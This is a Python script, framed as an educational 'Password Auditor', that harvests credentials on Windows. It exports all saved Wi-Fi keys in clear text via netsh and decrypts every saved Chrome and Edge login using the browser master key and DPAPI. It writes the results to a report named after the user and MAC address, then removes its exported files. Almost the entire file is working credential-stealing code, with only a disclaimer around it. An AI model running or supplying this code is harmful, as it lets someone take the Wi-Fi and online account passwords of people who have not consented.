"""
PASSWORD AUDITOR - Educational Credential & Wi-Fi Recovery Tool

Author(s): G Abhiram, Chirag Anil Ramamurthy

DISCLAIMER:
This tool is strictly for educational purposes only. It is intended to demonstrate how
locally stored credentials and Wi-Fi passwords can be accessed on a Windows system
that the user owns and has permission to audit. The authors do not condone or support
any form of malicious activity using this code. We are not responsible for any misuse
or illegal use of this script.
"""

import subprocess
import time
import xml.etree.ElementTree as ET
import os
import json
import base64
import shutil
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES

# --------------------------------------
# Fancy Intro Banner
# --------------------------------------
print("""
\n\n██████╗  █████╗ ███████╗███████╗ ██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗ ██████╗ 
██╔══██╗██╔══██╗╚══███╔╝██╔════╝██╔═══██╗██║   ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██████╔╝███████║  ███╔╝ █████╗  ██║   ██║██║   ██║██████╔╝   ██║   ██║   ██║██████╔╝
██╔═══╝ ██╔══██║ ███╔╝  ██╔══╝  ██║▄▄ ██║██║   ██║██╔═══╝    ██║   ██║   ██║██╔═══╝ 
██║     ██║  ██║███████╗███████╗╚██████╔╝╚██████╔╝██║        ██║   ╚██████╔╝██║     
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══▀▀═╝  ╚═════╝ ╚═╝        ╚═╝    ╚═════╝ ╚═╝     
                                                                                  
            Version 1.0 - Educational Use Only
""")
print("Loading Password Auditor modules...\n")

# --------------------------------------
# Resolve current username and MAC address
# --------------------------------------
response = subprocess.run("cd", capture_output=True, text=True, shell=True)
response = response.stdout.replace("\n", "")
x = response.split("\\")
name = x[2] if len(x) >= 3 else "UnknownUser"

mac = "UNKNOWN_MAC"
command = "ipconfig/all"
result = subprocess.run(command, capture_output=True, text=True, shell=True)
interfaces = result.stdout.split('\n\n')
for section in interfaces:
    if 'Wireless LAN adapter Wi-Fi:' in section:
        lines = section.split('\n')
        for line in lines:
            if "Physical Address" in line:
                mac = line.split(":")[-1].strip()
                break

name += f"_{mac.replace('-', '')}"

# --------------------------------------
# Function to extract Wi-Fi passwords
# --------------------------------------
def extract_wifi_passwords():
    wifi_details = []
    export_cmd = f"netsh wlan export profile key=clear folder={response}"
    subprocess.run(export_cmd, capture_output=True, text=True, shell=True)
    files = [f for f in os.listdir(response) if f.startswith('Wi-Fi') and f.endswith('.xml')]

    ns = {'ns': 'http://www.microsoft.com/networking/WLAN/profile/v1'}
    for file in files:
        try:
            tree = ET.parse(os.path.join(response, file))
            root = tree.getroot()
            ssid = root.find('ns:name', ns).text
            key = root.find('.//ns:keyMaterial', ns)
            password = key.text if key is not None else '[OPEN]' 
            wifi_details.append(f"{ssid} : {password}")
        except Exception as e:
            wifi_details.append(f"{file} : Error - {str(e)}")
    return wifi_details

# --------------------------------------
# Chrome/Edge Password Decryption Helpers
# --------------------------------------
def get_master_key(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_browser_password(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted = cipher.decrypt(payload)
    return decrypted[:-16].decode()

def extract_browser_passwords(browser_name, login_data_path, local_state_path):
    print(f"\nExtracting {browser_name} passwords...")
    output = []
    try:
        key = get_master_key(local_state_path)
        temp_db = f"login_data_{browser_name.lower()}.db"
        shutil.copy2(login_data_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        for url, username, encrypted_password in cursor.fetchall():
            try:
                decrypted = decrypt_browser_password(encrypted_password, key)
                output.append(f"{url}\n{username}:{decrypted}\n")
            except:
                output.append(f"{url}\n{username}: <decryption failed>\n")
        cursor.close()
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        output.append(f"Failed to extract from {browser_name}: {str(e)}")
    return output

# --------------------------------------
# Run Main Logic
# --------------------------------------
all_output = []

# IP and MAC Section
all_output.append("=== IP and MAC Details ===\n")
all_output.append(f"MAC Address: {mac}\n\n")

# Wi-Fi Passwords
all_output.append("=== Wi-Fi Profiles and Passwords ===\n")
wifi_data = extract_wifi_passwords()
all_output.extend([f + "\n" for f in wifi_data])

# Chrome Passwords
chrome_pass = extract_browser_passwords(
    "Chrome",
    os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'),
    os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State')
)
all_output.append("\n=== Chrome Saved Logins ===\n")
all_output.extend(chrome_pass)

# Edge Passwords
edge_pass = extract_browser_passwords(
    "Edge",
    os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'),
    os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State')
)
all_output.append("\n=== Edge Saved Logins ===\n")
all_output.extend(edge_pass)

# Save Results Locally
final_report = f"{name}_report.txt"
with open(final_report, 'w', encoding='utf-8') as report_file:
    report_file.writelines(all_output)

print(f"\n[✔] Report generated: {final_report}\n")
print("NOTE: This report contains sensitive information. Handle it securely.\n")

# --------------------------------------
# Clean Up Exported XML Files
# --------------------------------------
try:
    for file in os.listdir(response):
        if file.startswith("Wi-Fi") and file.endswith(".xml"):
            os.remove(os.path.join(response, file))
except:
    pass
